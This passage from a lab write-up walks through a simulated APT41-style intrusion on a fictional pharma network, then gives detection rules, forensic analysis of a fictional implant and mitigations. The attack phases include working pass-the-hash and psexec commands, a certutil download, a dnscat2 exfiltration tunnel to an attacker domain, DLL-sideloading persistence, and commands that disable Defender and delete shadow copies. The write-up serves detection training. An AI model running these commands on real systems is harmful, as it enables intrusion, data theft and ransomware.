  ──[LSASS dump → PtH]───────────► DC01 (Windows, Administrator)
  ──[DCSync]─────────────────────► full domain
```

**Linux to Windows via Impacket [[10]](#ref-10):**

```bash
# Test access to WS01 with stolen plaintext creds
crackmapexec smb 192.168.10.50 -u jsmith -p 'Research#2024' --shares

# Interactive shell on WS01
impacket-psexec novatech.local/jsmith:'Research#2024'@192.168.10.50 cmd.exe
# C:\Windows\system32>whoami
# novatech\jsmith
```

**Pass-the-Hash after LSASS dump (no plaintext needed):**

```bash
crackmapexec smb 192.168.10.0/24 \
  -u administrator \
  -H "aad3b435b51404eeaad3b435b51404ee:ADMIN_NTLM_HASH" \
  --local-auth -x "whoami"

# Get DA shell on DC01
impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:ADMIN_NTLM_HASH" \
  novatech.local/administrator@192.168.10.10 cmd.exe
# C:\Windows\system32>whoami
# nt authority\system
```

**BloodHound for attack path visualization:**

Running SharpHound on WS01 and importing into BloodHound [[11]](#ref-11) shows the complete attack path graphically. The "Find Shortest Paths to Domain Admins" query returns exactly the chain we executed. For lab participants, this is the step that makes the entire path visually undeniable — from `www-data` to domain ownership, every edge labeled.

**WMI for quieter lateral movement:**

```bash
# WMI execution creates no SCM service record, less noisy than psexec
impacket-wmiexec novatech.local/administrator:'NovaTech_Admin2024!'@192.168.10.50 \
  "whoami && systeminfo"
```

---

## Phase 6: Collection — Staging the Crown Jewels

**ATT&CK: T1005, T1074.001, T1560.001**

From DC01 as SYSTEM, we mount the file server shares:

```bash
net use Z: \\192.168.10.20\Research /user:NOVATECH\Administrator NovaTech_Admin2024!
net use Y: \\192.168.10.20\Manufacturing /user:NOVATECH\Administrator NovaTech_Admin2024!

# Identify high-value files
dir Z:\ /s /b | findstr /i "trial data formula synthesis patent"

# Copy to local staging area
mkdir C:\Temp\archive
robocopy Z:\ C:\Temp\archive\Research /E /NFL /NDL
robocopy Y:\ C:\Temp\archive\Manufacturing /E /NFL /NDL
robocopy \\192.168.10.10\SYSVOL C:\Temp\archive\SYSVOL /E /NFL /NDL

# Compress with password (7z fetched via certutil LOLBIN)
certutil.exe -urlcache -f http://10.0.0.5:8900/7za.exe C:\Temp\7za.exe
C:\Temp\7za.exe a -tzip -p"RxPhage2024!" -mx9 C:\Temp\data.zip C:\Temp\archive\

# Simulated result: 2.3 GB archive
```

`certutil -urlcache -f` is a documented LOLBAS technique for file download using a signed Windows binary. It generates Sysmon Event ID 1 (Process Create) for `certutil.exe` with a suspicious command line — a detectable but often tuned-out event in environments with heavy legitimate certutil use.

---

## Phase 7: Exfiltration — Two Channels

**ATT&CK: T1041, T1048.001**

### Primary: HTTPS via RxPhage C2 (simulated)

The simulated RxPhage implant sends the archive over HTTPS to the Sliver C2 in chunks. User-Agent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) Oracle/Java-Update/8.0.361` (fictional, simulated). All RxPhage traffic parameters described in this article are simulated values.

```
sliver (dc01) > download C:\Temp\data.zip /opt/loot/dc01_data.zip
[*] Downloading C:\Temp\data.zip (2.31 GB) ...
[*] 2.31 GB transferred
```

The Zeek `conn.log` shows a long series of HTTPS connections to `10.0.0.10:443` at roughly 60-second spacing — the beacon rhythm, detectable as a behavioral signal.

### Backup: DNS Tunneling — T1048.001

If HTTPS egress is blocked, dnscat2 provides a resilient fallback. DNS is rarely filtered outbound.

```bash
# Attacker: start dnscat2 server with shared secret (symmetric encryption → T1048.001)
ruby dnscat2.rb --dns "host=10.0.0.5,port=53,domain=tunnel.attacker-infra.com" \
  --no-cache --secret="DragonRx2024"

# WEB01: connect client
/tmp/.cache/dnscat --secret="DragonRx2024" tunnel.attacker-infra.com
```

T1048.001 (Exfiltration Over Symmetric Encrypted Non-C2 Protocol) applies here because dnscat2's `--secret` flag uses HMAC-based symmetric encryption over the DNS channel. If used without encryption, the correct sub-technique would be T1048.003.

The DNS tunnel generates high-entropy subdomain queries — random-looking base64-encoded strings — that are a behavioral signature of tunneling and distinguishable from legitimate DNS traffic by entropy analysis.

---

## Phase 8: Persistence — DLL Sideloading on the Domain Controller

**ATT&CK: T1574.002, T1053.005**

DLL sideloading is a documented APT41 persistence technique. [[6]](#ref-6)[[7]](#ref-7) PlugX, one of the group's primary implants, has used it extensively. The pattern: place a legitimate, digitally signed vendor binary alongside a malicious DLL in a directory the binary will search before `%SystemRoot%`.

Java's `java.exe` searches for `jvm.dll` in its working directory before the system path. Placing `java.exe` in a plausible-looking `C:\ProgramData\Oracle\Java\javapath\` directory alongside a malicious `jvm.dll` ensures the implant loads every time `java.exe` runs.

```cmd
# Create plausible directory (simulated)
mkdir "C:\ProgramData\Oracle\Java\javapath"

# Copy legitimate, signed java.exe
copy "C:\Program Files\Java\jre8\bin\java.exe" ^
     "C:\ProgramData\Oracle\Java\javapath\java.exe"

# Drop malicious DLL (simulated RxPhage loader)
sliver (dc01) > upload /opt/tools/rxphage/rxphage_loader.dll ^
                       "C:\ProgramData\Oracle\Java\javapath\jvm.dll"

# Scheduled task: run at boot as SYSTEM
schtasks /create /tn "JavaUpdateService" ^
  /tr "C:\ProgramData\Oracle\Java\javapath\java.exe" ^
  /sc ONSTART /ru SYSTEM /f

# Timestomp to blend with OS file dates
powershell -command ^
  "(Get-Item 'C:\ProgramData\Oracle\Java\javapath\jvm.dll').LastWriteTime = '2023-01-15 09:00:00'"
```

Every DC01 reboot: `java.exe` runs as SYSTEM, loads `jvm.dll`, RxPhage beacons. Sysmon Event ID 7 (Image Load) flags `jvm.dll` as `Signed: false` — the real Oracle JVM DLL carries a valid Oracle code-signing certificate. That single flag — unsigned DLL loaded by `java.exe` from a non-standard path — is the clearest forensic marker of this persistence technique.

Note on timestomping: modifying `$STANDARD_INFORMATION` timestamps via `LastWriteTime` is detectable because the `$FILE_NAME` attribute timestamps, updated by the NTFS kernel driver on file creation, remain accurate. MFT forensics comparing both attributes reveals the inconsistency.

---

## Phase 9 (Optional): The Criminal Turn — Ransomware

**ATT&CK: T1562.001, T1490, T1486**

APT41's criminal dimension creates a scenario where the same victim environment, already exfiltrated for espionage, gets monetized through ransomware. APT41 has been assessed to have experimented with ransomware in specific campaigns, though this remains less thoroughly documented than the espionage track.

Pre-ransomware preparation:

```cmd
# Disable Windows Defender (simulated)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"

# Inhibit System Recovery — delete Volume Shadow Copies (T1490)
vssadmin delete shadows /all /quiet

# Stop backup services
net stop "wbengine" /y
net stop "SDRSVC" /y
```

In the simulation, a custom Go encryptor targets only `C:\Temp\RansomTest\` — a safe, contained test path. It leaves `DRAGONRX_RANSOM.txt` (fictional) following the double-extortion format: pay within 72 hours or the exfiltrated clinical data gets published.

`vssadmin delete shadows` maps to **T1490 (Inhibit System Recovery)** — the technique designed to prevent recovery via shadow copies. T1486 (Data Encrypted for Impact) covers the ransomware encryption step. T1485 (Data Destruction) applies when the attacker directly overwrites or destroys victim data, not when deleting recovery mechanisms.

---

## Phase 10: Detection — What the SOC Finally Sees

**The uncomfortable reality about detection timing:**

The attack began on Day 1 at 14:23. The SOC escalates on Day 6 at 08:00 — **4 days, 17 hours, 36 minutes after initial access.** The LSASS alert that triggers the escalation fired on Day 4 at 10:15, but sat unreviewed in the queue for 36 hours. Mandiant M-Trends 2024 [[8]](#ref-8) puts the global median dwell time at 10 days; our scenario is conservative.

Here are the 12 alerts generated across 5 days — and when they were reviewed:

| Day | Time (UTC) | Alert | Confidence | Reviewed? |
|-----|------------|-------|------------|-----------|
| 1 | 14:23 | Log4Shell JNDI pattern in HTTP header (Zeek) | Critical | No |
| 1 | 14:24 | Java spawning bash shell — Sysmon EID 1 (WEB01) | Critical | No |
| 1 | 14:31 | New .jsp file in Tomcat webroot (Sysmon EID 11) | High | No |
| 2 | 09:15 | Port scan from web server (Zeek conn.log) | Medium | No |
| 3 | 11:45 | LDAP queries from Linux IP 192.168.10.100 | Medium | No |
| 3 | 16:30 | NTLM LogonType=3 from Linux IP to WS01 (EID 4624) | High | No |
| 4 | 08:00 | RC4 TGS for svc_backup — Kerberoasting signal (EID 4769) | High | No |
| 4 | 10:15 | **LSASS accessed by rundll32.exe on WS01 (Sysmon EID 10)** | Critical | **Day 6** |
| 4 | 13:00 | DS-Replication-Get-Changes-All on DC01 (EID 4662) | Critical | Day 6 |
| 5 | 02:00 | Unsigned jvm.dll loaded by java.exe on DC01 (Sysmon EID 7) | High | Day 6 |
| 5 | 03:30 | Suspicious long DNS labels >40 chars (Zeek tunnel heuristic) | Medium | Day 6 |
| 5 | 04:00 | 2.3 GB archive in C:\Temp + large HTTPS upload (Sysmon + Zeek) | Medium | Day 6 |

Twelve actionable alerts across five days. All were in the queue. None were reviewed until Day 6. This is not a detection tooling failure — every technique was caught. It is a triage, staffing, and prioritization failure.

### Key Detection Rules

**Log4Shell — Zeek (network):**

```zeek
event http_header(c: connection, is_orig: bool, name: string, value: string) {
    local jndi_pattern = /\$\{[a-zA-Z0-9_\-:\/\.]*jndi[a-zA-Z0-9_\-:\/\.]*:/;
    if ( is_orig && jndi_pattern in value ) {
        NOTICE([$note=Notice::LOG, $conn=c,
                $msg=fmt("Log4Shell JNDI in header %s: %s", name, value)]);
    }
}
```

**LSASS memory access — Wazuh rule (Sysmon EID 10):**

```xml
<rule id="100110" level="15">
  <if_group>sysmon_event10</if_group>
  <field name="win.eventdata.targetImage" type="pcre2">(?i)lsass\.exe</field>
  <description>LSASS memory access — credential dumping attempt (T1003.001)</description>
</rule>
```

**DCSync — Elastic KQL (Windows EID 4662):**

```
event.code:4662 AND 
winlog.event_data.Properties:*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2* AND 
NOT winlog.computer_name:(DC01* OR DC02*)
```

The GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` identifies the `DS-Replication-Get-Changes-All` extended right. Only Domain Controllers should generate EID 4662 with this access right. Any non-DC host generating it indicates a DCSync in progress.

**Prerequisite:** EID 4662 requires that Directory Service Access auditing is explicitly enabled (Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → DS Access → Audit Directory Service Access) AND that the appropriate SACL is configured on the domain naming context object. Without these configured, EID 4662 will not generate — verify before relying on this rule.

**Kerberoasting — Elastic (Windows EID 4769):**

```
event.code:4769 AND 
winlog.event_data.TicketEncryptionType:0x17 AND
NOT winlog.event_data.ServiceName:*$
```

**Context required:** EID 4769 + RC4 (0x17) is a Kerberoasting signal, not a confirmation. The rule has meaningful signal only when contextualized: the requesting account has no legitimate reason for RC4 (non-legacy environment), the target SPN is a service account (not computer account or system SPN), or the requesting host is unusual (e.g., a Linux server requesting Windows Kerberos tickets). In environments with legacy systems or applications forcing RC4, this rule will generate significant noise and requires tuning against baselines.

**DLL Sideloading — Elastic (Sysmon EID 7):**

```
event.code:7 AND 
winlog.event_data.Signed:false AND 
winlog.event_data.ImageLoaded:*jvm.dll AND 
NOT winlog.event_data.ImageLoaded:*\\Program Files\\*
```

**VSS deletion — process creation telemetry (primary signal):**

VSS deletion is most reliably detected via process creation telemetry (Sysmon EID 1 / Windows EID 4688) matching command lines for `vssadmin delete shadows`, `wmic shadowcopy delete`, `wbadmin delete catalog`, `diskshadow`, or PowerShell `Remove-WmiObject Win32_ShadowCopy`. Windows Event ID 524 (Volume Shadow Copy service event: "A shadow copy of volume X was deleted") is an additional signal but does not fire in all configurations, does not capture the calling command line, and should not be the primary detection mechanism.

```
event.code:1 AND
process.name:(vssadmin.exe OR wmic.exe OR diskshadow.exe OR wbadmin.exe) AND
process.command_line:(*delete* OR *remove*)
```

**DNS tunneling — Zeek entropy detection:**

```bash
python3 << 'EOF'
import math

def entropy(s):
    freq = {}
    for c in s: freq[c] = freq.get(c, 0) + 1
    return -sum(p/len(s)*math.log2(p/len(s)) for p in freq.values())

with open('/usr/local/zeek/logs/current/dns.log') as f:  # inside dragonrx_zeek container
    for line in f:
        if line.startswith('#'): continue
        fields = line.strip().split('\t')
        if len(fields) < 10: continue
        query = fields[9]
        subdomain = query.split('.')[0]
        if len(subdomain) > 15 and entropy(subdomain) > 3.5:
            print(f"[DNS TUNNEL] {query} (entropy={entropy(subdomain):.2f})")
EOF
```

---

## DFIR — Full Investigation

**Trigger:** Day 6, 08:00 — SOC analyst reviews backlog, escalates the Day 4 LSASS alert. Incident declared.

### Triage: First 30 Minutes — Answer Before Touching Live Hosts

```bash
# Is the attacker still active? (Zeek logs live inside dragonrx_zeek container)
docker exec dragonrx_zeek tail -f /usr/local/zeek/logs/current/conn.log | grep "192.168.10.100"
# Yes: periodic connections to 10.0.0.10:443 still ongoing — live C2 session

# When did the initial compromise occur?
docker exec dragonrx_zeek grep "jndi:" /usr/local/zeek/logs/current/http.log | head -1 | zeek-cut ts
# 1713610987.0 → April 20, 14:23:07 UTC
# Dwell time: 4 days 17 hours

# How many hosts are involved?
# Kibana: event.code:(4624 OR 4662 OR 4769) AND winlog.event_data.IpAddress:192.168.10.100
# Returns hits on: WS01, DC01, FS01
```

**Scope:** WEB01, WS01, DC01, FS01. All four hosts in scope.

### Memory Acquisition

Acquire memory before touching disk — live memory contains active network connections, running processes, credential material, and open file handles that are lost at shutdown.

```bash
# WEB01 (Linux) — avml
sudo /tmp/avml /tmp/web01_memory.lime
scp analyst@192.168.10.100:/tmp/web01_memory.lime /dfir/evidence/web01/
sha256sum /dfir/evidence/web01/web01_memory.lime > web01_memory.lime.sha256

# WS01, DC01 (Windows) — WinPmem
.\winpmem_mini_x64_rc2.exe ws01_memory.raw
```

### Memory Analysis — Volatility3 [[12]](#ref-12)

```bash
# WEB01: recover bash history from memory even after history -c
vol3 -f web01_memory.lime linux.bash
# Recovers: wget, chmod, crontab, nohup rxphage commands — attacker activity chain

# WEB01: confirm RxPhage running
vol3 -f web01_memory.lime linux.pslist | grep rxphage
# PID 1337  PPID 1  rxphage  www-data  (simulated)

# WEB01: live network connections
vol3 -f web01_memory.lime linux.netstat
# ESTABLISHED  192.168.10.100:54231 → 10.0.0.10:443  rxphage (PID 1337)

# WS01: extract what attacker obtained from LSASS
vol3 -f ws01_memory.raw windows.lsadump
# jsmith NTLM: YYYY...  Administrator NTLM: XXXX...

# DC01: confirm sideloaded DLL
vol3 -f dc01_memory.raw windows.dlllist --pid <JAVA_PID>
# C:\ProgramData\Oracle\Java\javapath\jvm.dll  Signed: false  ← sideloading
```

**Key forensic finding:** `linux.bash` recovers the complete attacker command history from WEB01 even after `history -c` was executed. The bash history file is backed by memory pages; clearing the file does not zero the pages. Volatility reads those pages directly from the memory image.

### Disk Forensics and Timeline

```bash
# Create supertimeline from WS01 disk image
log2timeline.py --storage-file ws01_timeline.plaso \
  --parsers "winreg,winevtx,mft,prefetch,lnk,pe,srum" \
  /dfir/evidence/ws01/ws01_disk.img

psort.py -o dynamic ws01_timeline.plaso \
  "date > '2026-04-20 00:00:00'" > ws01_timeline.csv

grep -iE "jvm.dll|rxphage|JavaUpdateService|lsass.dmp|data.zip|SharpHound" ws01_timeline.csv
```

**Windows artifact highlights:**

*Prefetch files* (`C:\Windows\Prefetch\`) record execution evidence for every binary that ran. Prefetch for `SHARPHOUND.EXE`, `7ZA.EXE`, and `RUNDLL32.EXE` (comsvcs.dll in command line) persist even after the attacker deleted those binaries from disk.

*SRUM (System Resource Usage Monitor)* (`C:\Windows\System32\sru\SRUDB.dat`) records network bytes sent and received per process. `java.exe` (the sideloaded process) shows 2.31 GB sent to `10.0.0.10` — corroborating exfiltration volume from a data source independent of the network capture.

*MFT ($MFT):* The `$MFT` shows `jvm.dll` created at `02:00:15 UTC April 24` — despite the timestomp setting `LastWriteTime` to `2023-01-15`. Timestomping via `LastWriteTime` modifies the `$STANDARD_INFORMATION` attribute only. The `$FILE_NAME` attribute, updated by the NTFS kernel driver on actual file creation, retains the real timestamp. Comparing both attributes exposes the inconsistency.

### Reconstructed Attack Timeline

```
2026-04-20 14:23:07  Log4Shell payload in X-Api-Version header → JNDI callback (Zeek)
2026-04-20 14:23:11  Exploit.class fetched from 10.0.0.20:8080 (Zeek)
2026-04-20 14:23:12  Reverse shell: www-data@web01 → attacker (Zeek conn.log)
2026-04-20 14:24:01  cache.jsp webshell written to /resources/imgs/ (MFT)
2026-04-20 14:31:55  rxphage downloaded to /tmp/.cache/ (bash history, MFT)
2026-04-20 14:32:10  First RxPhage beacon: 192.168.10.100 → 10.0.0.10:443 (Zeek)
2026-04-21 09:15:33  Internal network scan 192.168.10.0/24 (Zeek conn.log)
2026-04-21 11:45:02  LDAP enumeration using svc_ldap creds (LDAP server log)
2026-04-22 16:30:17  NTLM LogonType=3 from 192.168.10.100 to WS01 (EID 4624)
2026-04-23 08:00:44  RC4 TGS for svc_backup (EID 4769)
2026-04-23 10:15:22  LSASS dumped via comsvcs.dll/rundll32 (Sysmon EID 10, EID 1)
2026-04-23 13:00:01  DCSync: DS-Replication-Get-Changes-All (EID 4662)
2026-04-24 02:00:15  jvm.dll written to C:\ProgramData\ (MFT $FILE_NAME timestamp)
2026-04-24 02:05:33  JavaUpdateService scheduled task created (EID 4698)
2026-04-24 03:30:42  High-entropy DNS subdomains to attacker domain (Zeek DNS)
2026-04-24 04:00:00  data.zip (2.31 GB) created on DC01 (MFT, Sysmon)
2026-04-24 04:00–04:47  2.31 GB exfiltrated via HTTPS C2 (Zeek conn.log, SRUM)
2026-04-25 08:00:00  SOC escalation — incident declared

DWELL TIME: 4 days, 17 hours, 36 minutes
```

---

## Malware Analysis: RxPhage (Simulated)

**RxPhage is a fictional implant created for this simulation.** All technical characteristics described below — the binary, XOR key, C2 paths, User-Agent, campaign ID, chunk sizes, mutex name, and IOCs — are simulated values that do not correspond to real malware. The analysis walkthrough demonstrates techniques applicable to real-world Go-based RAT analysis.

### Static Analysis

```bash
# Basic triage
file rxphage.exe
# PE32+ executable (GUI) x86-64, MS Windows

sha256sum rxphage.exe  # generate lab IOC (simulated)

ls -lh rxphage.exe
# 11.4M — consistent with Go static compilation

# Entropy check
python3 -c "
import math
def entropy(data):
    freq = [0]*256
    for b in data: freq[b] += 1
    return -sum(p/len(data)*math.log2(p/len(data)) for p in freq if p > 0)
with open('rxphage.exe','rb') as f: data = f.read()
print(f'Entropy: {entropy(data):.2f}')
"
# 6.34 — not packed (packed binaries approach 7.5-8.0)
```

**The `strings` dead end — and what it teaches:**

```bash
strings rxphage.exe | grep -E "\.com|http|C2|beacon|oracle"
# Nothing useful
```

The C2 domain and all configuration strings are XOR-encoded with key `0x4C` (simulated). `strings` on the binary produces no C2 infrastructure — a common initial obstacle for modern implants.

**Go symbol tables are a goldmine:**

```bash
strings rxphage.exe | grep -E "rxphage/|main\."
# rxphage/beacon.checkin
# rxphage/config.Decode
# rxphage/evasion.IsAnalysisEnvironment
# rxphage/handler.execShell
# rxphage/persist.installWindows
# rxphage/tunnel.dnscat
```

Go binaries retain their symbol tables (`pclntab`) even after compilation with `-ldflags="-s -w"`. Unlike stripped C/C++ binaries, Go preserves every package path, function name, and often the developer's build machine path. The symbol table describes the full malware architecture before a disassembler is opened. This is why Go has become an attractive language for implant development — but it simultaneously hands analysts the skeleton of the malware for free.

**Config extraction — recovering the simulated C2 domain:**

In Ghidra, locate `rxphage/config.Decode` and trace it to the XOR decode loop:

```
for (i=0; i < len(encodedConfig); i++) {
    raw[i] = encodedConfig[i] ^ 0x4C;
}
```

Extract the encoded bytes from the `.rdata` section and decode locally:

```python
encoded = [0x29, 0x3B, 0x38, 0x38, 0x38, ...]  # from Ghidra (simulated)
decoded = bytes([b ^ 0x4C for b in encoded])
print(decoded.decode('utf-8'))
# {"C2Primary":"updates.oracle-cdn.com","C2Port":443,        [SIMULATED domain]
#  "UserAgent":"Mozilla/5.0 ... Oracle/Java-Update/8.0.361", [SIMULATED UA]
#  "MutexName":"JavaUpdateMutex_v2",                         [SIMULATED]
#  "SleepMin":30,"SleepMax":120,"JitterPct":0.2,
#  "CampaignID":"DRAGONRX-2024-001"}                         [SIMULATED]
```

**PE import analysis:**

```python
import pefile
pe = pefile.PE('rxphage.exe')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(entry.dll.decode())
# KERNEL32.dll, ntdll.dll, WINHTTP.dll
```

`WINHTTP.dll` confirms HTTPS C2 capability. Minimal imports are characteristic of Go binaries. In real implant analysis, look additionally for `NtSetSystemTime` (timestomping) or `NtCreateSection`/`NtMapViewOfSection` (process injection).

### Dynamic Analysis

**Sysmon events generated on first execution (simulated):**

```
EID 1 (Process Create):
  Image: C:\ProgramData\Oracle\Java\javapath\java.exe
  CommandLine: (empty — -H=windowsgui flag hides console)

EID 7 (Image Load):
  Image: java.exe
  ImageLoaded: C:\ProgramData\Oracle\Java\javapath\jvm.dll
  Signed: false  ← KEY INDICATOR
  SignatureStatus: NoSignature

EID 3 (Network Connection):
  Image: java.exe (appears as legitimate signed process)
  DestinationIP: 10.0.0.10  [simulated C2]
  DestinationPort: 443
```

The network connection appears to originate from `java.exe`. Process-based allow lists that trust signed binaries will miss it. The detection signal is EID 7 — `Signed: false` on a DLL loaded from `ProgramData`. This is why DLL sideloading is effective and why Sysmon's image load logging, with signature validation, is essential.

**Network traffic pattern (simulated):**

```
POST /api/v2/telemetry   every 30-120 seconds [simulated interval]
User-Agent: Mozilla/5.0 ... Oracle/Java-Update/8.0.361  [simulated]
X-Client-Id: <UUID>
X-Session: <Base64(XOR(timestamp))>
Body: Base64(XOR(JSON beacon data))
```

Two encoding layers appear in C2 traffic:
- **Base64 encoding of the transport body → T1132.001** (Data Encoding: Standard Encoding)
- **XOR obfuscation of the config and payload content → T1027** (Obfuscated Files or Information)

These are distinct techniques; the article maps them separately in the ATT&CK table.

### Anti-Analysis Techniques (Simulated)

RxPhage checks three conditions before starting:

1. **VM MAC prefix check:** VMware (`00:0c:29`, `00:50:56`), VirtualBox (`08:00:27`), QEMU (`52:54:00`), Parallels (`00:1c:42`).
2. **Sandbox username check:** `sandbox`, `cuckoo`, `malware`, `analyst`, `any.run`, others.
3. **Sleep timing check:** 3-second sleep with elapsed time validation. Sandboxes that accelerate `time.Sleep` are detected.

If any condition is true, the binary exits silently.

### YARA Rule (for simulated RxPhage in lab)

```yara
rule RxPhage_PlugXLite_LAB {
    meta:
        author      = "Andrey Pautov"
        description = "Detects simulated RxPhage implant — Operation DragonRx lab only"
        date        = "2026-04"
        reference   = "fictional simulation — not real malware"

    strings:
        $go_beacon   = "rxphage/beacon" ascii
        $go_evasion  = "rxphage/evasion" ascii
        $c2_path1    = "/api/v2/telemetry" ascii   /* simulated paths */
        $c2_path2    = "/api/v2/analytics" ascii   /* simulated paths */
        $mutex       = "JavaUpdateMutex" ascii wide /* simulated */
        $ua          = "Oracle/Java-Update" ascii  /* simulated */
        $pclntab     = { FF FF FF FB 00 00 }

    condition:
        uint16(0) == 0x5A4D and filesize < 25MB and (
            (2 of ($go_beacon, $go_evasion)) or
            ($c2_path1 and $c2_path2) or
            ($mutex and $ua and $pclntab)
        )
}
```

---

## Scope, Impact, and Eradication

**Hosts compromised (simulated):** WEB01, WS01, DC01, FS01.
**Credentials stolen:** All domain accounts via DCSync — including `krbtgt`.
**Data exfiltrated:** 2.31 GB — Phase III clinical trial data and synthesis documentation.
**Dwell time:** 4 days, 17 hours, 36 minutes.

**Eradication checklist:**

1. **Isolate immediately.** Block all egress from compromised hosts at the perimeter firewall and kill the live C2 session.
2. **Reset `krbtgt` twice, 10 hours apart.** A single reset is insufficient — existing Kerberos tickets remain valid for their lifetime (up to 10 hours). Two resets with that gap invalidate all outstanding tickets.
3. **Reset all domain accounts.** DCSync provides every account's NTLM hash. Assume all are compromised.
4. **Remove persistence.** Delete `jvm.dll` and `java.exe` from `C:\ProgramData\Oracle\Java\javapath\`, delete the `JavaUpdateService` scheduled task. Remove `cache.jsp` from the Tomcat webroot. Remove the cron entry on WEB01.
5. **Patch Log4j.** Upgrade all instances of Log4j to 2.17.1+ (for Log4j 1.x, migrate to Log4j 2.17.1+). Inventory all Java applications for vulnerable Log4j versions in classpath.
6. **Move `svc_ldap` credentials** out of `context.xml` and into a secrets management solution.
7. **Consider domain rebuild.** With a confirmed DCSync and `krbtgt` compromise, the safest recovery path is domain rebuild. It is expensive but eliminates residual persistence uncertainty.

**On regulatory obligations:** Exfiltration of clinical trial data may trigger multiple reporting obligations depending on data content. If Protected Health Information (PHI) is involved, HIPAA breach notification requirements apply. GxP-regulated clinical data implicates FDA data integrity obligations and contractual obligations to trial sponsors and institutional review boards. FDA 21 CFR Part 11 addresses electronic records and signature integrity requirements — it is not a data breach notification regulation and should not be cited as the primary regulatory framing for a breach. Engage legal counsel and your compliance team to assess applicable obligations before any notification or public statement.

---

## Defensive Posture — What Would Have Stopped This

| Control | Stops or Mitigates What | Notes |
|---------|------------------------|-------|
| Patch Log4j to 2.17.1+ | Initial access via CVE-2021-44228 | Highest priority — vendor patch |
| Secrets manager for credentials | Config file credential harvest | HashiCorp Vault, AWS Secrets Manager, Azure Key Vault |
| Network segmentation: web tier → DC | LDAP/SMB lateral movement from WEB01 | Firewall rule: deny 192.168.10.100 → 389, 445 |
| Kerberos AES-only enforcement | Reduces Kerberoasting crack speed | GPO: Network Security → Kerberos → Configure encryption types |
| Protected Users security group for DA accounts | Prevents NTLM auth and credential caching for DAs | Disables RC4, NTLM, WDigest for group members |
| Credential Guard | Reduces LSA-isolated credential exposure (domain creds) | GPO + UEFI; protects VSM-isolated LSASS material — does not prevent all dump vectors. Complement with LSA Protection (PPL), EDR vendor controls, and ASR rule "Block credential stealing from LSASS" for layered coverage |
| LAPS (Local Administrator Password Solution) | Local admin Pass-the-Hash across workstations | Randomizes local admin passwords per host |
| EDR with behavioral detection | DLL sideloading, LSASS access, process anomalies | CrowdStrike, SentinelOne, Microsoft Defender for Endpoint |
| Alert triage SLA — 4-hour target for Critical | Detection delay | Organizational process: the tooling caught every phase; the gap was review time |

**The compound failure pattern:** Each misconfiguration in this scenario — Log4j unpatched, credentials in `context.xml`, `svc_backup` over-privileged, no Credential Guard, no LAPS, no network segmentation — is individually manageable. All five together create a complete path from the internet to domain domination in under four days. Defense in depth is the only architecture that forces an attacker to independently exploit multiple failures simultaneously.

---

## Full ATT&CK Coverage — Operation DragonRx (Simulated)

| Phase | Technique | ID |
|-------|------------|-----|
| Recon | Active Scanning: Vulnerability Scanning | T1595.002 |
| Recon | Gather Victim Host Info: Software | T1592.002 |
| Initial Access | Exploit Public-Facing Application (Log4Shell) | T1190 |
| Execution | Command and Scripting: Unix Shell | T1059.004 |
| Persistence | Server Software Component: Web Shell | T1505.003 |
| Persistence | Scheduled Task: Cron | T1053.003 |
| Persistence | Scheduled Task: Windows Task | T1053.005 |
| Persistence | Hijack Execution Flow: DLL Side-Loading | T1574.002 |
| Discovery | Network Service Discovery | T1046 |
| Discovery | Account Discovery: Domain Account | T1087.002 |
| Discovery | Domain Trust Discovery | T1482 |
| Credential Access | Unsecured Credentials: Files | T1552.001 |
| Credential Access | Steal/Forge Kerberos Tickets: Kerberoasting | T1558.003 |
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 |
| Credential Access | OS Credential Dumping: DCSync | T1003.006 |
| Lateral Movement | Use Alternate Auth Material: Pass the Hash | T1550.002 |
| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 |
| Lateral Movement | Windows Management Instrumentation | T1047 |
| Collection | Data Staged: Local Data Staging | T1074.001 |
| Collection | Archive Collected Data: Archive via Utility | T1560.001 |
| Collection | Data from Local System | T1005 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 |
| Exfiltration | Exfil Over Alt Protocol: Symmetric Encrypted Non-C2 (DNS tunnel w/ shared secret) | T1048.001 |
| C2 | Application Layer Protocol: Web Protocols (HTTPS) | T1071.001 |
| C2 | Data Encoding: Standard Encoding (Base64) | T1132.001 |
| C2 | Fallback Channels (DNS tunnel) | T1008 |
| Defense Evasion | Obfuscated Files: XOR-encoded config | T1027 |
| Defense Evasion | Signed Binary Proxy Execution: Rundll32 | T1218.011 |
| Defense Evasion | Indicator Removal: File Deletion | T1070.004 |
| Defense Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 |
| Defense Evasion | Hijack Execution Flow: DLL Side-Loading (evasion aspect) | T1574.002 |
| Impact | Inhibit System Recovery (VSS deletion) | T1490 |
| Impact | Data Encrypted for Impact (ransomware) | T1486 |

---

## Conclusions

The individual techniques deployed in Operation DragonRx are not exotic. Log4Shell, Kerberoasting, LOLBAS LSASS dumping, DLL sideloading, DNS tunneling — all have public tooling, documented detection rules, and known mitigations. What makes APT41 effective is not unique technical sophistication but the combination: operational discipline, documented speed in weaponizing new vulnerabilities (Log4Shell exploitation within hours of public disclosure), the dual-mandate willingness to monetize access beyond state tasking, and persistent, patient lateral movement.

The gap in this scenario is not in the security tooling. Wazuh, Elastic, Sysmon, and Zeek caught every single phase — all twelve alerts were generated in the correct windows. The gap is in review time: critical alerts sitting unreviewed for 36 hours while 2.31 GB of clinical trial data moved across the wire. Tooling without triage is not defense.

For anyone building the lab: `git clone https://github.com/anpa1200/dragonrx-lab && bash scripts/deploy.sh` brings the full stack up in under an hour on a single Linux workstation. Docker-only mode (no Windows VMs) works in minutes and covers the Log4Shell → Sliver → SIEM detection chain completely. The attack playbook, DFIR, and malware analysis follow from there. The scenario gives you a controlled environment to train on documented APT41 TTPs, validate your detection rules, and practice incident response workflow before you need it.

---

*All tools, techniques, and commands described in this article are intended for use in isolated, authorized lab environments only. NovaTech Pharma, Operation DragonRx, RxPhage, and all associated IP addresses, domains, credentials, campaign IDs, and IOCs are entirely fictional.*

